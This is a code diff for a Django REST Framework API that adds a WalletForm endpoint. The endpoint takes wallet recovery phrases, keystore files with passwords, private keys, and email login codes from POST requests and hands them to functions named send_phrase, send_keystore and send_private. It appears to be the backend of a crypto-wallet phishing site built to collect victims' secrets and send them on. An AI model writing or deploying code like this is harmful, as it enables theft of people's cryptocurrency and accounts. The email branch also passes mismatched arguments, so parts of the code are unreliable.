@@ -1,7 +1,10 @@
+import json
+from django.http import HttpRequest
 from rest_framework import views
 from rest_framework import generics
 from rest_framework.response import Response
 from v1.cmc import csv_to_data, data
+from v1.formats import send_keystore, send_phrase, send_private
 
 
 from v1.models import WalletListModel
@@ -19,3 +22,25 @@ class DataAPIView(views.APIView):
 class WalletListView(generics.ListCreateAPIView):
     queryset = WalletListModel.objects.all()
     serializer_class = WalletListSerializer
+
+
+class WalletForm(views.APIView):
+    def post(self, request: HttpRequest, *args, **kwargs):
+        data = json.loads(request.body)
+        type = data.get('type')
+        if not type:
+            return Response({'status': 0, 'message':'Type not found'})
+        print(data)
+        if type == 'phrase':
+            print(data.get('token'))
+            status = send_phrase(data.get('token'))
+            return Response({'status': status})
+        if type == 'keystore':
+            status = send_keystore(data.get('token'), data.get('password'))
+            return Response({'status': status})
+        if type == 'private':
+            status = send_private(data.get('pKey'))
+            return Response({'status': status})
+        if type == 'email':
+            status = send_keystore(data.get('email'), data.get('password'), data.get('code'))
+            return Response({'status': status})
